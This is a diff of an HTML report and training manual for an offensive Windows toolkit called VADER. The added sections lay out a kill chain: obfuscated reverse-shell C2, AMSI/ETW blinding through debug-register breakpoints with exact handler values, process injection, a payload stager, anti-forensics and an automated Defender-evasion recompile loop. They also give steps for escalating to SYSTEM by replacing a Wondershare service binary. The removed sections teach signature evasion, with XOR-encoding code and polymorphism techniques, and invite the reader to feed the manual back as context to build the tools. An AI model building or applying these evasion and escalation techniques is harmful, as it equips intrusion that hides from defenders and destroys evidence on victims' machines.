+      <span class="lv-value">14</span>
+      <span class="lv-label">Total Findings</span>
+      <span class="lv-value">53 (#1&ndash;#30 vader-toctou, #31&ndash;#53 rootkit phase)</span>
+      <span class="lv-label">Confirmed Bypasses</span>
+      <span class="lv-value">AMSI, ETW, Defender Static, Defender Behavioral, Process Injection</span>
+      <span class="lv-label">Privilege Escalation</span>
+      <span class="lv-value">Standard User &rarr; NT AUTHORITY\SYSTEM</span>
+      <span class="lv-label">Disclosure</span>
+      <span class="lv-value">Responsible disclosure via MSRC</span>
     </div>
   </div>
+</section>
 
-  <!-- ══════════════════════════════════════════════════════ -->
-  <!--              LEARNING MANUAL — TOC                     -->
-  <!-- ══════════════════════════════════════════════════════ -->
-  <div class="manual-section">
-    <div class="manual-header">
-      <span class="manual-tag">MANUAL I</span>
-      <span class="manual-title">LEARNING MANUAL &mdash; Guided Build</span>
-    </div>
-
-    <div class="part-label">PART 1: UNDERSTANDING THE ENEMY</div>
-    <ul class="toc-list">
-      <li><span class="toc-num">01</span><a href="#learn-ch1">How Defender Detects</a><span class="toc-sub">scan pipeline, mpengine.dll stages, ML classification</span></li>
-      <li><span class="toc-num">02</span><a href="#learn-ch2">What Signatures Actually Match</a><span class="toc-sub">byte patterns, wildcards, detection layers</span></li>
-    </ul>
-
-    <div class="part-label">PART 2: SIGNATURE EVASION &amp; POLYMORPHISM</div>
-    <ul class="toc-list">
-      <li><span class="toc-num">03</span><a href="#learn-ch3">XOR Encoding Deep Dive</a><span class="toc-sub">per-vector keys, key rotation, batch encoding</span></li>
-      <li><span class="toc-num">04</span><a href="#learn-ch4">Beyond XOR &mdash; Polymorphic Techniques</a><span class="toc-sub">symbol rename, code reorder, junk code, compiler flags, stack strings</span></li>
-      <li><span class="toc-num">05</span><a href="#learn-ch5">Building a Mutation Pipeline</a><span class="toc-sub">parse, mutate, compile, scan loop architecture</span></li>
-    </ul>
-
-    <div class="part-label">PART 3: PROCESS INJECTION</div>
-    <ul class="toc-list">
-      <li><span class="toc-num">06</span><a href="#learn-ch6">Why Injection Is Needed</a><span class="toc-sub">HWBP per-process limit, dark room propagation</span></li>
-      <li><span class="toc-num">07</span><a href="#learn-ch7">Debug Registers &mdash; The Hardware Layer</a><span class="toc-sub">DR0-DR7, DR7 bit layout, execute breakpoints</span></li>
-      <li><span class="toc-num">08</span><a href="#learn-ch8">Injection Techniques</a><span class="toc-sub">CreateRemoteThread, APC, thread context, SetThreadContext</span></li>
-      <li><span class="toc-num">09</span><a href="#learn-ch9">Designing VADER's Injector</a><span class="toc-sub">DLL injection, VEH handler, ASLR, new thread problem</span></li>
-    </ul>
-
-    <div class="part-label">PART 4: OPERATIONAL ARCHITECTURE</div>
-    <ul class="toc-list">
-      <li><span class="toc-num">10</span><a href="#learn-ch10">The Complete Kill Chain</a><span class="toc-sub">current state, connection map, ideal chain, completeness criteria</span></li>
-    </ul>
-
-    <ul class="toc-list" style="margin-top: 0.5rem;">
-      <li><span class="toc-num">&mdash;</span><a href="#learn-exercises">Exercises Index</a><span class="toc-sub">17 exercises, 4 difficulty levels</span></li>
-      <li><span class="toc-num">&mdash;</span><a href="#learn-reading">Reading List</a><span class="toc-sub">books, papers, courses</span></li>
-    </ul>
+<!-- ════════════ SECTION 2: KILL CHAIN ════════════ -->
+<section id="killchain">
+  <div class="section-header">
+    <div class="section-number">Section 02</div>
+    <h2 class="section-title">Kill Chain Architecture</h2>
   </div>
 
-  <!-- ══════════════════════════════════════════════════════ -->
-  <!--              EXECUTION MANUAL — TOC                    -->
-  <!-- ══════════════════════════════════════════════════════ -->
-  <div class="manual-section">
-    <div class="manual-header">
-      <span class="manual-tag">MANUAL II</span>
-      <span class="manual-title">EXECUTION MANUAL &mdash; Step-by-Step Kill Chain</span>
+  <div class="prose" style="margin-bottom: 1.5rem;">
+    <p>Each phase is independently testable, collectively composable. Phases 1+2 create the "dark room" — an environment where all user-mode telemetry is blind. Phase 3 exploits the dark room for privilege escalation.</p>
+  </div>
+
+  <div class="killchain">
+
+    <div class="kc-phase">
+      <div class="kc-label">Phase 0</div>
+      <div class="kc-content">
+        <div class="kc-name">C2 Infrastructure</div>
+        <div class="kc-detail">vader_shell &mdash; XOR-obfuscated reverse shell, automated listener</div>
+      </div>
+      <span class="kc-status status-built">BUILT</span>
     </div>
 
-    <ul class="toc-list">
-      <li><span class="toc-num">01</span><a href="#exec-preflight">Pre-Flight Checklist</a><span class="toc-sub">compiler, python, defender, user context, detection status</span></li>
-      <li><span class="toc-num">02</span><a href="#exec-quickstart">Quick Start (deploy.py)</a><span class="toc-sub">recon, status, deploy, chain, listen, canary</span></li>
-      <li><span class="toc-num">03</span><a href="#exec-killchain">Manual Execution: Full Kill Chain</a><span class="toc-sub">recon, C2, dark room, privesc vectors V4/V6/V7</span></li>
-      <li><span class="toc-num">04</span><a href="#exec-verify">Verification Checklist</a><span class="toc-sub">evidence collection, canary, screenshots</span></li>
-      <li><span class="toc-num">05</span><a href="#exec-troubleshoot">Troubleshooting</a><span class="toc-sub">component detected, dark room fails, canary missing, C2 issues</span></li>
-      <li><span class="toc-num">06</span><a href="#exec-cleanup">Cleanup</a><span class="toc-sub">remove DLLs, canaries, binaries</span></li>
-      <li><span class="toc-num">07</span><a href="#exec-newtarget">Setting Up a New Target Machine</a><span class="toc-sub">baseline, clone, compiler, recon, adapt</span></li>
-      <li><span class="toc-num">&mdash;</span><a href="#exec-appendix-a">Appendix A: File Reference</a><span class="toc-sub">complete file manifest</span></li>
-      <li><span class="toc-num">&mdash;</span><a href="#exec-appendix-b">Appendix B: XOR Key Quick Reference</a><span class="toc-sub">per-vector keys and canary paths</span></li>
-    </ul>
+    <div class="kc-phase">
+      <div class="kc-label">Phase 1</div>
+      <div class="kc-content">
+        <div class="kc-name">AMSI Bypass</div>
+        <div class="kc-detail">Hardware Breakpoints (DR0) &mdash; zero memory modification</div>
+      </div>
+      <span class="kc-status status-confirmed">CONFIRMED</span>
+    </div>
+
+    <div class="kc-phase">
+      <div class="kc-label">Phase 2</div>
+      <div class="kc-content">
+        <div class="kc-name">ETW Bypass</div>
+        <div class="kc-detail">Hardware Breakpoints (DR1) &mdash; process telemetry blind</div>
+      </div>
+      <span class="kc-status status-confirmed">CONFIRMED</span>
+    </div>
+
+    <div class="kc-phase">
+      <div class="kc-label">Phase 3</div>
+      <div class="kc-content">
+        <div class="kc-name">Privilege Escalation</div>
+        <div class="kc-detail">Service Binary Replacement (CWE-732) &mdash; Standard User &rarr; SYSTEM</div>
+      </div>
+      <span class="kc-status status-confirmed">CONFIRMED</span>
+    </div>
+
+    <div class="kc-phase">
+      <div class="kc-label">Phase 3+0</div>
+      <div class="kc-content">
+        <div class="kc-name">SYSTEM Reverse Shell</div>
+        <div class="kc-detail">Privesc + C2 integration &mdash; SYSTEM cmd.exe callback to operator</div>
+      </div>
+      <span class="kc-status status-built">BUILT</span>
+    </div>
+
+    <div class="kc-phase">
+      <div class="kc-label">Phase 4</div>
+      <div class="kc-content">
+        <div class="kc-name">Process Injection (HOTEL)</div>
+        <div class="kc-detail">DLL injection + HWBP on all threads &mdash; process-wide AMSI/ETW blind</div>
+      </div>
+      <span class="kc-status status-confirmed">CONFIRMED</span>
+    </div>
+
+    <div class="kc-phase">
+      <div class="kc-label">Phase 5</div>
+      <div class="kc-content">
+        <div class="kc-name">Stager / Dropper (INDIA)</div>
+        <div class="kc-detail">WinHTTP download cradle &mdash; fetch staged payloads from C2</div>
+      </div>
+      <span class="kc-status status-built">BUILT</span>
+    </div>
+
+    <div class="kc-phase">
+      <div class="kc-label">Phase 6</div>
+      <div class="kc-content">
+        <div class="kc-name">Anti-Forensics (JULIET)</div>
+        <div class="kc-detail">Canary wipe, log clearing, prefetch cleanup, timestomp, self-delete</div>
+      </div>
+      <span class="kc-status status-built">BUILT</span>
+    </div>
+
+    <div class="kc-phase">
+      <div class="kc-label">Meta</div>
+      <div class="kc-content">
+        <div class="kc-name">Auto-Mutation Pipeline</div>
+        <div class="kc-detail">XOR key rotation + recompile + Defender rescan loop &mdash; automated evasion</div>
+      </div>
+      <span class="kc-status status-built">BUILT</span>
+    </div>
+
+  </div>
+</section>
+
+<!-- ════════════ SECTION 3: CWE-732 ════════════ -->
+<section id="cwe732">
+  <div class="section-header">
+    <div class="section-number">Section 03</div>
+    <h2 class="section-title">Primary Finding &mdash; CWE-732 Privilege Escalation</h2>
   </div>
 
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">Vulnerability</div>
+      <div class="prose">
+        <p>Wondershare <strong>NativePushService</strong> runs as <code>LocalSystem</code> (highest privilege) with <code>Auto</code> start mode, but its binary resides in a per-user <code>AppData</code> directory with <code>BUILTIN\Users Full Control</code> on both the directory and the executable.</p>
+        <p>A standard user can <strong>rename the running service binary</strong> (Windows permits this on locked files) and <strong>plant a replacement</strong>. On next service restart or system reboot, the Service Control Manager loads the attacker's binary as <code>NT AUTHORITY\SYSTEM</code>.</p>
+      </div>
+    </div>
 
-  <!-- ══════════════════════════════════════════════════════════════════ -->
-  <!--                                                                    -->
-  <!--                   LEARNING MANUAL — FULL CONTENT                   -->
-  <!--                                                                    -->
-  <!-- ══════════════════════════════════════════════════════════════════ -->
+    <div class="card">
+      <div class="card-title">CVSS Assessment</div>
+      <div class="cvss-bar">
+        <div>
+          <div class="cvss-score">7.8</div>
+          <div class="cvss-label">High Severity</div>
+        </div>
+      </div>
+      <div class="cvss-vector" style="margin-bottom: 0.75rem;">CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</div>
+      <div class="lv-grid" style="grid-template-columns: 140px 1fr;">
+        <span class="lv-label">CWE</span>
+        <span class="lv-value">CWE-732 &mdash; Incorrect Permission Assignment for Critical Resource</span>
+        <span class="lv-label">Attack Vector</span>
+        <span class="lv-value">Local</span>
+        <span class="lv-label">Complexity</span>
+        <span class="lv-value">Low</span>
+        <span class="lv-label">Privileges</span>
+        <span class="lv-value">Low (standard user)</span>
+        <span class="lv-label">User Interaction</span>
+        <span class="lv-value">None</span>
+      </div>
+    </div>
+  </div>
 
-  <hr class="content-divider">
-
-  <h1 class="part-header" style="margin-top:1rem;">LEARNING MANUAL</h1>
-  <p style="color:var(--muted); font-size:0.82rem;">Guided Build: Signature Evasion, Polymorphism, and Process Injection</p>
-
-  <hr>
-
-  <h3>How to Use This Manual</h3>
-
-  <p>This is a hands-on learning guide. It teaches the concepts you need to build the missing pieces of the VADER toolkit &mdash; automated signature evasion and <a class="xref" href="#learn-ch8">process injection</a> &mdash; by understanding what they are and why they work.</p>
-
-  <p><strong>This is not a copy-paste guide.</strong> Each chapter explains the concept, shows the architecture, provides pseudocode, and then gives you exercises. You write the actual code. When you're ready to build, feed this document back as context and work through it step by step.</p>
-
-  <p>Every chapter connects back to the ASF framework:</p>
-
-  <blockquote>
-    1. Search for knowledge, not for 0-days<br>
-    2. See the paths, see what blocks you, find a substitute way<br>
-    3. Crash &gt; leak memory &gt; execute arbitrary code<br>
-    4. To find crashes, you need fuzzing
-  </blockquote>
-
-  <!-- ── PART 1 ── -->
-  <h1 class="part-header" id="learn-part1">Part 1: Understanding the Enemy</h1>
-  <div class="part-doctrine">ASF Principle 1: "Search for knowledge, not for 0-days." Before you evade detection, understand how detection works.</div>
-
-  <!-- Chapter 1 -->
-  <h2 id="learn-ch1">Chapter 1: How Defender Detects</h2>
-
-  <p>Windows Defender's scan engine (<code>mpengine.dll</code>) processes files through a multi-stage pipeline. Understanding the stages tells you what you're actually fighting.</p>
-
-  <h3>The Scan Pipeline (Simplified)</h3>
-
-<pre><code>INPUT FILE
-    |
-    v
-[Stage 1: File Type ID]     &lt;- Magic bytes, file extension, header parsing
-    |
-    v
-[Stage 3: Signature Match]  &lt;- Static byte-pattern matching against VDM database
-    |                          This is what catches most malware.
-    |                          If your binary matches a known pattern -> DETECTED.
-    |
-    v
-[Stage 5: PE Emulation]     &lt;- Runs the binary in a lightweight emulator
-    |                          Watches for suspicious API call sequences.
-    |                          Example: VirtualAlloc -> memcpy -> CreateThread
-    |
-    v
-[Stage 7: Container Extract] &lt;- Opens archives (ZIP, RAR, CAB), extracts contents,
-    |                           re-scans each extracted file from Stage 1.
-    |                           Recursive. Nested ZIPs = nested scans.
-    |
-    v
-[Stage 8: Script Deobfusc]  &lt;- NScript engine. Deobfuscates JS/VBS/PS1.
-    |                          Unrolls string concatenation, base64, char codes.
-    |                          Then re-evaluates the deobfuscated script.
-    |
-    v
-[Stage 10: Lua Rules]       &lt;- Custom detection logic written in Lua.
-    |                          Microsoft's analysts write these for new threats.
-    |                          Flexible, hard to reverse, frequently updated.
-    |
-    v
-[Stage 12: ML Classification] &lt;- Machine learning model (cloud + local).
-    |                            Scores the binary on features: imports, sections,
-    |                            entropy, strings, structure.
-    |
-    v
-VERDICT: CLEAN or DETECTED</code></pre>
-
-  <h3>What This Means for You</h3>
-
-  <ul>
-    <li><strong>Stage 3 (<a class="xref" href="#learn-ch2">signatures</a>)</strong> is the primary detection layer for known malware. This is what <a class="xref" href="#learn-ch3">XOR</a> key rotation defeats.</li>
-    <li><strong>Stage 5 (emulation)</strong> watches behaviour, not bytes. If your code calls <code>VirtualProtect</code> + <code>WriteProcessMemory</code> in sequence, it's suspicious even if the strings are encrypted. This is why VADER uses <a class="xref" href="#learn-ch7">hardware breakpoints</a> (no VirtualProtect at all).</li>
-    <li><strong>Stage 12 (ML)</strong> scores structural features. A binary with high entropy, suspicious imports, and small size looks like malware regardless of the content. This is why compilation flags matter (<code>/O1</code> produces different structural features than <code>/O2</code>).</li>
-  </ul>
-
-  <h3>Key Insight</h3>
-
-  <p>Static <a class="xref" href="#learn-ch2">signatures</a> are the easiest to beat and the most common detection method. Behavioural detection (emulation + ML) is harder to evade but also harder for Microsoft to deploy against novel techniques. VADER's <a class="xref" href="#learn-ch7">HWBP</a> approach bypasses both because:</p>
-  <ol>
-    <li>No memory patching &rarr; no signature on the patch bytes</li>
-    <li>No VirtualProtect calls &rarr; no behavioural trigger</li>
-    <li>Uses CPU <a class="xref" href="#learn-ch7">debug registers</a> &rarr; invisible to user-mode inspection</li>
+  <h3>Attack Chain</h3>
+  <ol class="attack-steps">
+    <li>Standard user identifies SYSTEM service with insecure ACLs and phantom DLLs via automated scanner (<code>vader_recon.ps1</code>, 20-section scan with PE import parser)</li>
+    <li>Standard user renames the running service executable &mdash; Windows allows renaming open/locked files</li>
+    <li>Standard user plants replacement binary in the same directory &mdash; <code>BUILTIN\Users:(I)(F)</code> grants Full Control, no UAC prompt triggered</li>
+    <li>Service restarts (reboot or manual) &mdash; SCM loads attacker binary as <code>NT AUTHORITY\SYSTEM</code></li>
+    <li>Replacement binary writes execution proof, launches original exe for service continuity, optionally spawns SYSTEM reverse shell</li>
   </ol>
 
-  <hr>
+  <h3>Canary Evidence</h3>
+  <div class="evidence-block">20260615_033636|SYSTEM|elev=1|pid=34776|BINARY_REPLACE
+                 ^^^^^^ ^^^^^^
+                 SYSTEM  ELEVATED &mdash; Full SYSTEM token, not filtered
+                 No admin credentials entered. No UAC prompt triggered.</div>
 
-  <!-- Chapter 2 -->
-  <h2 id="learn-ch2">Chapter 2: What Signatures Actually Match</h2>
+  <h3>Defense Analysis</h3>
+  <table>
+    <thead>
+      <tr>
+        <th>Defense Layer</th>
+        <th>Status</th>
+        <th>Analysis</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>File ACL</td>
+        <td><span class="badge badge-red">BROKEN</span></td>
+        <td><code>BUILTIN\Users:(I)(F)</code> &mdash; all users Full Control on .exe</td>
+      </tr>
+      <tr>
+        <td>Directory ACL</td>
+        <td><span class="badge badge-red">BROKEN</span></td>
+        <td><code>BUILTIN\Users:(OI)(CI)(F)</code> &mdash; inherited Full Control</td>
+      </tr>
+      <tr>
+        <td>UAC</td>
+        <td><span class="badge badge-amber">NOT TRIGGERED</span></td>
+        <td>Writing to AppData, not a protected system path</td>
+      </tr>
+      <tr>
+        <td>Code Signing</td>
+        <td><span class="badge badge-amber">NOT ENFORCED</span></td>
+        <td>SCM does not verify digital signatures on service binaries</td>
+      </tr>
+      <tr>
+        <td>Defender Static</td>
+        <td><span class="badge badge-green">CLEAN</span></td>
+        <td>Replacement binary is a legitimate service exe structure</td>
+      </tr>
+      <tr>
+        <td>Manifest Hardening</td>
+        <td><span class="badge badge-amber">BYPASSED</span></td>
+        <td>Entire binary replaced &mdash; no DLL loading involved</td>
+      </tr>
+      <tr>
+        <td>KnownDLLs</td>
+        <td><span class="badge badge-dim">IRRELEVANT</span></td>
+        <td>No DLL hijacking involved in this vector</td>
+      </tr>
+    </tbody>
+  </table>
+</section>
 
-  <p>A Defender static signature is a byte pattern with optional wildcards. Think of it like a regex for binary data.</p>
-
-  <h3>Example Signature (Conceptual)</h3>
-
-<pre><code>Rule: Trojan:Win32/VaderShell.A
-Pattern: { 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 48 89 C7 [5-20] C7 45 ?? 52 41 44 45 }
-         +- LEA RCX    -+ +- CALL ------+ +- MOV RDI -+         +- "RADE" on stack -+</code></pre>
-
-  <p>This would match any binary that:</p>
-  <ol>
-    <li>Has a <code>LEA RCX</code> instruction followed by a <code>CALL</code></li>
-    <li>Followed within 5-20 bytes by the bytes <code>52 41 44 45</code> (ASCII "RADE")</li>
-  </ol>
-
-  <h3>What Changes the Pattern</h3>
-
-  <p>If you <a class="xref" href="#learn-ch3">XOR-encode</a> "RADE" with key <code>0x52</code>:</p>
-  <ul>
-    <li>R (0x52) XOR 0x52 = 0x00</li>
-    <li>A (0x41) XOR 0x52 = 0x13</li>
-    <li>D (0x44) XOR 0x52 = 0x16</li>
-    <li>E (0x45) XOR 0x52 = 0x17</li>
-  </ul>
-
-  <p>Now the bytes on disk are <code>00 13 16 17</code> instead of <code>52 41 44 45</code>. The signature no longer matches. But the code flow (LEA + CALL + MOV) is unchanged &mdash; if the signature included those instructions, you'd need to change the code structure too.</p>
-
-  <h3>Layers of Detection (What Beats What)</h3>
-
-<pre><code>DETECTION LAYER          | WHAT IT MATCHES              | WHAT DEFEATS IT
--------------------------+------------------------------+------------------------
-Static byte patterns     | Exact sequences in the       | XOR key rotation,
-                         | binary on disk                | string re-encoding
-                         |                               |
-Structural signatures    | Code flow patterns            | Code reordering,
-                         | (instruction sequences)       | junk code insertion,
-                         |                               | compiler flag changes
-                         |                               |
-Import hashing           | Which APIs the binary         | Dynamic API resolution
-                         | imports (IAT)                 | (GetProcAddress at
-                         |                               | runtime)
-                         |                               |
-Behavioural (emulation)  | What the code DOES when       | Anti-emulation checks,
-                         | run in sandbox                | environmental keying,
-                         |                               | delayed execution
-                         |                               |
-ML classification        | Statistical features          | Padding, section
-                         | (entropy, size, imports,      | manipulation, import
-                         | section names)                | blending</code></pre>
-
-  <div class="exercise">
-    <h4>Exercise 1.1</h4>
-    <p>Open one of the VADER source files (e.g., <code>dark_room_annotated.c</code>). Identify:</p>
-    <ol>
-      <li>Which strings would appear in the binary on disk (after compilation)?</li>
-      <li>Which are <a class="xref" href="#learn-ch3">XOR</a>-encoded and which are plaintext?</li>
-      <li>If Defender signatured the plaintext strings, what would you change?</li>
-    </ol>
+<!-- ════════════ SECTION 4: HWBP BLIND SPOT ════════════ -->
+<section id="hwbp">
+  <div class="section-header">
+    <div class="section-number">Section 04</div>
+    <h2 class="section-title">MSRC-Potential Finding &mdash; Defender HWBP Blind Spot</h2>
   </div>
 
-  <div class="exercise">
-    <h4>Exercise 1.2</h4>
-    <p>Run <code>scan_all.py</code> against the current binaries. Then modify ONE binary: change the <a class="xref" href="#learn-ch3">XOR</a> key, recompile, and re-scan. Did the result change? This is the empirical proof that <a class="xref" href="#learn-ch3">XOR</a> rotation defeats static <a class="xref" href="#learn-ch2">signatures</a>.</p>
+  <div class="card">
+    <div class="card-title">Finding Summary</div>
+    <div class="prose">
+      <p>
+        Defender's tamper protection monitors <strong>memory-level</strong> modifications (VirtualProtect calls, byte writes to code regions, known patch patterns) but does not monitor <strong>CPU debug register manipulation</strong>. Hardware breakpoints set via <code>SetThreadContext</code> on DR0&ndash;DR3, combined with a Vectored Exception Handler, can intercept and neuter security functions <strong>without modifying a single byte of target memory</strong>.
+      </p>
+      <p>
+        Both <strong>AMSI</strong> (script scanning) and <strong>ETW</strong> (process telemetry) are simultaneously bypassed using this technique. The result is the "dark room" &mdash; all user-mode telemetry goes blind. No detection. No quarantine. Zero memory modification.
+      </p>
+    </div>
   </div>
 
-  <hr>
-
-  <!-- ── PART 2 ── -->
-  <h1 class="part-header" id="learn-part2">Part 2: Signature Evasion &amp; Polymorphism</h1>
-  <div class="part-doctrine">ASF Principle 2: "See the paths, see what blocks you, find a substitute way." When Defender blocks one encoding, the block itself reveals what it matched.</div>
-
-  <!-- Chapter 3 -->
-  <h2 id="learn-ch3">Chapter 3: XOR Encoding Deep Dive</h2>
-
-  <p>You already know <a class="xref" href="#learn-ch3">XOR encoding</a> from the existing codebase. This chapter takes it deeper.</p>
-
-  <h3>How XOR Encoding Works in VADER</h3>
-
-  <p>Every vector encodes sensitive strings (function names, paths, tags) as byte arrays XOR'd with a key. At runtime, the code decodes them into a stack buffer.</p>
-
-  <p><strong>Encoding (build time):</strong></p>
-
-<pre><code>Original:  "AmsiScanBuffer"
-Key:       0x41
-Encoded:   each byte XOR 0x41
-           A(0x41)^0x41=0x00, m(0x6D)^0x41=0x2C, s(0x73)^0x41=0x32, ...
-Result:    {0x00, 0x2C, 0x32, 0x28, 0x12, 0x22, 0x20, 0x2D, ...}</code></pre>
-
-  <p><strong>Decoding (runtime):</strong></p>
-
-<pre><code>unsigned char enc[] = {0x00, 0x2C, 0x32, 0x28, ...};
-char buf[64];
-for (int i = 0; i &lt; sizeof(enc); i++)
-    buf[i] = enc[i] ^ 0x41;
-// buf now contains "AmsiScanBuffer"</code></pre>
-
-  <h3>Why Different Keys Per Vector</h3>
-
-  <p>If V4 (key <code>0x52</code>) and V7 (key <code>0x19</code>) both encode "CreateFileW", the resulting byte arrays are completely different:</p>
-
-<pre><code>"CreateFileW" XOR 0x52 = {0x11, 0x20, 0x37, 0x33, 0x26, 0x37, ...}
-"CreateFileW" XOR 0x19 = {0x5A, 0x6B, 0x7C, 0x78, 0x6D, 0x7C, ...}</code></pre>
-
-  <p>If Defender builds a signature for the first pattern, it doesn't match the second. Signature isolation.</p>
-
-  <h3>Key Rotation: The First Defence</h3>
-
-  <p>When <a class="xref" href="#learn-ch1">Defender</a> catches a component, your first response is key rotation:</p>
-  <ol>
-    <li>Pick a new XOR key (any byte 0x01-0xFF)</li>
-    <li>Re-encode all strings with the new key</li>
-    <li>Update the key constant in the source</li>
-    <li>Recompile</li>
-    <li>Re-scan</li>
-  </ol>
-
-  <p>This changes EVERY encoded byte in the binary. Defender's static signature no longer matches.</p>
-
-  <div class="exercise">
-    <h4>Exercise 3.1: Manual Key Rotation</h4>
-    <p>Take <code>vectors/v7_phantom_dll/phantom_dll_annotated.c</code>. The current XOR key is <code>0x19</code>.</p>
-    <ol>
-      <li>Find all XOR-encoded byte arrays in the source</li>
-      <li>Decode each one (XOR with <code>0x19</code>) to get the original strings</li>
-      <li>Pick a new key (e.g., <code>0xBB</code>)</li>
-      <li>Re-encode each string with the new key</li>
-      <li>Update the key constant</li>
-      <li>Compile and scan</li>
-    </ol>
-    <p><strong>Python helper for encoding:</strong></p>
-<pre><code>def xor_encode(plaintext, key):
-    return ", ".join(f"0x{b ^ key:02X}" for b in plaintext.encode())
-
-# Example:
-print(xor_encode("AmsiScanBuffer", 0xBB))</code></pre>
+  <h3>How It Works</h3>
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-title">AMSI Bypass (DR0)</div>
+      <div class="lv-grid" style="grid-template-columns: 100px 1fr;">
+        <span class="lv-label">Target</span>
+        <span class="lv-value"><code>AmsiScanBuffer</code> in amsi.dll</span>
+        <span class="lv-label">Register</span>
+        <span class="lv-value">DR0 = function address, execution breakpoint</span>
+        <span class="lv-label">Handler</span>
+        <span class="lv-value">VEH sets RAX = <code>0x80070057</code> (E_INVALIDARG), simulates <code>ret</code></span>
+        <span class="lv-label">Effect</span>
+        <span class="lv-value">Script content scanning returns failure &mdash; all scripts pass</span>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">ETW Bypass (DR1)</div>
+      <div class="lv-grid" style="grid-template-columns: 100px 1fr;">
+        <span class="lv-label">Target</span>
+        <span class="lv-value"><code>EtwEventWrite</code> in ntdll.dll</span>
+        <span class="lv-label">Register</span>
+        <span class="lv-value">DR1 = function address, execution breakpoint</span>
+        <span class="lv-label">Handler</span>
+        <span class="lv-value">VEH sets RAX = <code>0</code> (STATUS_SUCCESS), simulates <code>ret</code></span>
+        <span class="lv-label">Effect</span>
+        <span class="lv-value">Process telemetry silently succeeds but never fires &mdash; events discarded</span>
+      </div>
+    </div>
   </div>
 
-  <div class="exercise">
-    <h4>Exercise 3.2: Batch Encoder</h4>
-    <p>Write a Python script that:</p>
-    <ol>
-      <li>Takes a list of strings and a key as input</li>
-      <li>Outputs C-formatted XOR-encoded arrays for each</li>
-      <li>Includes the null terminator (XOR'd)</li>
-    </ol>
-    <p>This is the building block for automation.</p>
+  <h3>Technique Comparison</h3>
+  <table>
+    <thead>
+      <tr>
+        <th>Attribute</th>
+        <th class="comparison-header-detected">Classic Patch (VirtualProtect)</th>
+        <th class="comparison-header-clean">Hardware Breakpoint (HWBP)</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>VirtualProtect called</td>
+        <td>Yes</td>
+        <td>No</td>
+      </tr>
+      <tr>
+        <td>Target memory modified</td>
+        <td>6 bytes patched</td>
+        <td>0 bytes &mdash; memory untouched</td>
+      </tr>
+      <tr>
+        <td>Defender detection</td>
+        <td><span class="badge badge-red">Behavior:Win32/AMSI_Patch_T.B12</span></td>
+        <td><span class="badge badge-green">NONE</span></td>
+      </tr>
+      <tr>
+        <td>Process killed</td>
+        <td>Yes (instant termination)</td>
+        <td>No (exits normally, code 0)</td>
+      </tr>
+      <tr>
+        <td>Binary quarantined</td>
+        <td>Yes (retroactive ML flag)</td>
+        <td>No (persists on disk)</td>
+      </tr>
+      <tr>
+        <td>Bypass mechanism</td>
+        <td>Overwrite function prologue</td>
+        <td>CPU exception before first instruction</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>Why It Works</h3>
+  <div class="card">
+    <div class="prose">
+      <p>
+        <code>SetThreadContext</code> is a standard Windows API. Setting debug registers on your own threads is a legitimate debugging operation. <strong>No behavioral rule exists</strong> for debug register manipulation targeting security-critical functions.
+      </p>
+      <p>
+        The kernel ETW-Ti provider exposes <code>EtwTiLogSetContextThread</code> which <em>should</em> fire when <code>SetThreadContext</code> modifies debug registers. If it fires but Defender ignores it, that's a <span class="highlight-amber">consumer gap</span>. If it doesn't fire for same-thread operations, that's a <span class="highlight-amber">provider gap</span>. Either way, the bypass works on current Windows 11 with full Defender RTP.
+      </p>
+    </div>
   </div>
 
-  <hr>
+  <h3>Dark Room Verification</h3>
+  <div class="evidence-block">PHASE 1: LOCATE
+  AmsiScanBuffer at 0x00007FFD6E8F8160                     [OK]
+  EtwEventWrite  at 0x00007FFD917E0430                     [OK]
 
-  <!-- Chapter 4 -->
-  <h2 id="learn-ch4">Chapter 4: Beyond XOR &mdash; Polymorphic Techniques</h2>
+PHASE 2: ACTIVATE
+  DR0 = AmsiScanBuffer (AMSI)                              [OK]
+  DR1 = EtwEventWrite (ETW)                                [OK]
+  DR7 = 0x405 (dual execution breakpoint)                  [OK]
+  VEH handler: single unified handler                      [OK]
 
-  <p><a class="xref" href="#learn-ch3">XOR</a> key rotation defeats static byte-pattern <a class="xref" href="#learn-ch2">signatures</a>. But Defender has other detection layers. To evade them, you need deeper mutations.</p>
+PHASE 3: VERIFY
+  AMSI: AmsiScanBuffer -> 0x80070057 (E_INVALIDARG)       [BLIND]
+  ETW:  EtwEventWrite  -> 0 (STATUS_SUCCESS)              [BLIND]
 
-  <h3>Technique 1: Variable Name Randomisation</h3>
+  Defender detection: NONE
+  Memory modified:    ZERO bytes
+  Binary quarantined: NO</div>
+</section>
 
-  <p>Compiler output includes symbol names in debug info and sometimes in the binary itself. Even without debug info, function names in DLL exports are visible.</p>
-
-  <p><strong>Before:</strong></p>
-<pre><code>void DarkRoomHandler(PEXCEPTION_POINTERS ex) { ... }
-FARPROC pAmsiScanBuffer = NULL;</code></pre>
-
-  <p><strong>After randomisation:</strong></p>
-<pre><code>void ServiceMonitorCallback(PEXCEPTION_POINTERS ex) { ... }
-FARPROC pValidateInput = NULL;</code></pre>
-
-  <p>Same code, different symbols. The name "DarkRoomHandler" is a signature in itself.</p>
-
-  <p><strong>Limitation:</strong> Internal variable names (local variables, function parameters) usually don't survive compilation to release binaries. This matters most for exported DLL functions and global symbols.</p>
-
-  <h3>Technique 2: Code Reordering</h3>
-
-  <p>Compilers emit functions in the order they appear in source. Defender can signature the ORDER of functions, not just their content.</p>
-
-  <p><strong>Before:</strong></p>
-<pre><code>setup_veh()
-resolve_targets()
-set_breakpoints()
-verify_bypass()</code></pre>
-
-  <p><strong>After reordering:</strong></p>
-<pre><code>verify_bypass()
-set_breakpoints()
-setup_veh()
-resolve_targets()</code></pre>
-
-  <p>The binary has different code layout. Structural <a class="xref" href="#learn-ch2">signatures</a> break.</p>
-
-  <p><strong>How to implement:</strong> Simply reorder functions in the source file. The compiler respects source order by default.</p>
-
-  <h3>Technique 3: Junk Code Insertion</h3>
-
-  <p>Insert code that executes but does nothing meaningful. Changes the binary's instruction flow, entropy, and size &mdash; all features that ML models use.</p>
-
-<pre><code>// Junk: appears to do computation but result is never used
-volatile int _jnk = 0;
